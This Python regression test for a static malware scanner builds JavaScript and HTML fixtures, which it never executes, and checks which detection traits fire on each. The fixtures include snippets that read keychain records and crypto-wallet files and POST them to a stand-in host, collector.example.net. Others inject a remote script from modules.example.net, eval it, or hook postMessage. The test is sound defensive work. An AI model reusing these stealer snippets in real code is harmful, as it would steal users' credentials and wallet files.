#!/usr/bin/env python3
"""Static scanner regressions; generated JavaScript is never executed."""
import argparse
import html
import json
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
KEYCHAIN = 'objectives/exfiltration/stealer/keychain::keychain-helper-result-http-body'
WALLET = 'objectives/exfiltration/stealer/wallet::wallet-files-helper-result-http-body'
COLLECTOR = 'objectives/exfiltration/stealer/multi-source::browser-staged-keychain-wallet-collector'
KEYCHAIN_HTML = 'objectives/exfiltration/stealer/keychain::html-keychain-dump-near-http-post'
WALLET_HTML = 'objectives/exfiltration/stealer/wallet::html-wallet-dump-near-http-post'
HOOK = 'micro-behaviors/process/hook/interception::window-postmessage-prototype-function-replacement'
VIEW = 'metadata/file/format/structured::firefox-view-source-body'
NEW = {KEYCHAIN, WALLET, COLLECTOR, KEYCHAIN_HTML, WALLET_HTML}


def export(reader, variable, kind, catch=True, logging=True):
    log = f'window.log && window.log({variable}.length);' if logging else ''
    handler = '.catch(function() {})' if catch else ''
    return f'''try {{
    const {variable} = {reader}();
    {log}
    fetch('https://collector.example.net/upload', {{
      method: 'POST',
      body: JSON.stringify({{cmd: '{kind}_dump', data: {variable}}})
    }}){handler};
    }} catch (e) {{}}
'''


def objects(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        value, end = decoder.raw_decode(text)
        yield value
        text = text[end:]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--cleave', default='cleave')
    args = ap.parse_args()
    key = export('readKeychain', 'records', 'keychain')
    wallet = export('getCryptoWalletFiles', 'files', 'wallet')
    stage = '''const agent = navigator.userAgent;
    const tag = document.createElement('script');
    tag.src = 'https://modules.example.net/bridge.js';
    document.head.appendChild(tag);
    eval(moduleSource);
'''
    both = stage + 'function load() { tag.onload = function() {\n' + key + wallet + '\n}; }'
    page = '<html><body><script>' + both + '</script></body></html>'
    captured = '<html><body id="viewsource">' + ''.join(
        '<span>' + html.escape(line) + '</span>\n' for line in page.splitlines()
    ) + '</body></html>'
    # Real Firefox source export leaves JS string quotes unescaped in spans.
    captured = captured.replace('&#x27;', "'").replace('&quot;', '"')
    unrelated = key.replace('data: records', "data: 'ready'")
    reassigned = key.replace('window.log &&', "records = []; window.log &&")
    cases = {
        'hook.js': ('Window.prototype.postMessage = function(msg) { return original.apply(this, arguments); };',
                    {HOOK}, NEW, True),
        'message-read.js': ('const original = Window.prototype.postMessage;', set(), NEW | {HOOK}, True),
        'key.js': (key, {KEYCHAIN}, {WALLET, COLLECTOR}, False),
        'wallet.js': (wallet, {WALLET}, {KEYCHAIN, COLLECTOR}, False),
        'renamed.js': (export('dumpKeychain', 'renamed', 'changed', False, False),
                       {KEYCHAIN}, {WALLET, COLLECTOR}, False),
        'wallet-renamed.ts': (export('collectWalletFiles', 'different', 'changed', False, False),
                             {WALLET}, {KEYCHAIN, COLLECTOR}, False),
        'nested.js': (both, {KEYCHAIN, WALLET, COLLECTOR}, set(), False),
        'page.html': (page, {KEYCHAIN_HTML, WALLET_HTML, COLLECTOR}, set(), False),
        'captured.html': (captured, {VIEW, KEYCHAIN_HTML, WALLET_HTML, COLLECTOR}, set(), False),
        'unrelated.js': (unrelated, set(), NEW, True),
        'reassigned.js': (reassigned, set(), NEW, True),
        'url-only.js': (key.replace('data: records', "data: 'ready'").replace(
            "'https://collector.example.net/upload'", 'records'), set(), NEW, True),
        'local.js': ('const records = readKeychain(); console.log(records);', set(), NEW, True),
        'comment.js': ('/*' + both + '*/', set(), NEW, True),
        'comment.html': ('<html><!--' + both + '--></html>', set(), NEW, True),
        'no-body.html': (page.replace('body: JSON.stringify', 'console: JSON.stringify'),
                         set(), NEW, True),
        'no-data.html': (page.replace('data: records', "status: 'ready'").replace(
            'data: files', "status: 'ready'"), set(), NEW, True),
        'empty-data.html': (page.replace('data: records', 'data: null').replace(
            'data: files', 'data: null'), set(), NEW, True),
        'logging.html': ('<html><script>console.log(' + json.dumps(page) + ');</script></html>',
                         set(), {COLLECTOR}, False),
        'one-store.html': ('<html><script>' + stage + key + '</script></html>',
                           {KEYCHAIN_HTML}, {WALLET_HTML, COLLECTOR}, False),
    }
    with tempfile.TemporaryDirectory(prefix='native-stores-') as tmp:
        for name, (source, _, _, _) in cases.items():
            Path(tmp, name).write_text(source)
        run = subprocess.run([args.cleave, '--no-update-check', '--traits-dir', str(ROOT),
                              '--disable', 'yara,radare2,upx', '--format=json', tmp],
                             check=True, capture_output=True, text=True)
        reports = {Path(f['path']).name: f for report in objects(run.stdout) for f in report['files']}
        for name, (_, required, forbidden, benign) in cases.items():
            traits = reports[name]['traits']
            emitted = {t['id'] for t in traits}
            assert required <= emitted, (name, 'missing', sorted(required - emitted))
            assert not forbidden & emitted, (name, 'unexpected', sorted(forbidden & emitted))
            if benign:
                risks = [t['id'] for t in traits if t['crit'] >= 4 and t['id'] !=
                         'objectives/command-and-control/dropper/script-eval/remote-code::fetch-eval-remote-code']
                assert not risks, (name, 'benign elevated findings', risks)
    print(f'PASS: {len(cases)} browser native-store cases')


if __name__ == '__main__':
    main()
